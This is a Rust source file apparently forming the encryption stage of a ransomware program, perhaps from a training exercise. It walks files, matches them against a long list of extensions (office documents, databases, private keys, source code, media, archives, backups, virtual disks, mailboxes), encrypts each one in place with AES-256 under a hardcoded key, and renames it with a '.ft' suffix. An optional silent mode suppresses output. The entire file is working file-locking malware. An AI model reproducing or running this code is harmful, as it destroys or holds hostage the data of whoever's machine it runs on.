use std::path::{PathBuf};
use std::fs::{File, rename};
use std::io::Write;
use std::ffi::OsStr;
use aes::cipher::{generic_array::GenericArray, BlockEncrypt, KeyInit};
use aes::Aes256;
use crate::Args;
use crate::utils;

fn check_extension(extension: &OsStr) -> bool {
    let valid_ext = [
        ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot",
        ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp",
        ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3",
        ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd",
        ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".hpp", ".h" ,".asm", ".js", ".cmd",
        ".bat", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp",
        ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg",
        ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma",
        ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm",
        ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar",
        ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx",
        ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2",
        ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb",
        ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot",
        ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm",
        ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc", ".yml", ".conf", ".py", ".template"
    ];
    let ext_formated = format!(".{}", extension.to_str().unwrap());
    if let Some(_res) = valid_ext.into_iter().find(|&x| x == ext_formated) {
        true
    } else {
        false
    }
}

fn crypt_content(path: &PathBuf, content: Vec<u8>) -> std::io::Result<()> {
    let key = [48u8; 32];
    let key_array = GenericArray::clone_from_slice(&key);
    let cipher = Aes256::new(&key_array);
    
    let mut new_content = content.clone();
    let new_size = 16 - (content.len() % 16);
    new_content.extend(vec![new_size as u8; new_size]);
    
    let mut new_path = path.clone();
    new_path.as_mut_os_string().push(".ft");
    let mut dest_aes = File::create(path)?;
    rename(path, new_path)?;
    
    let mut i = 0;
    while i < new_content.len() {
        let mut block = GenericArray::clone_from_slice(&new_content[i..i + 16]);
        cipher.encrypt_block(&mut block);
        dest_aes.write_all(&block)?;
        i += 16;
    }
    Ok(())
}

pub fn atk_process(path: &PathBuf, args: &Args) {
    let extension = path.extension();
    match extension {
        Some(ex) => {
            if check_extension(ex) {
                let content  = utils::get_file_content(path);
                match content {
                    Some(res) => {
                        if let Err(_e) = crypt_content(path, res) {
                            return;
                        }
                        if !args.silent {
                            println!("🔒File crypted: {:?}", path);
                        }
                    },
                    None => {
                        return;
                    }
                }
            }
        },
        None => {}
    }
}
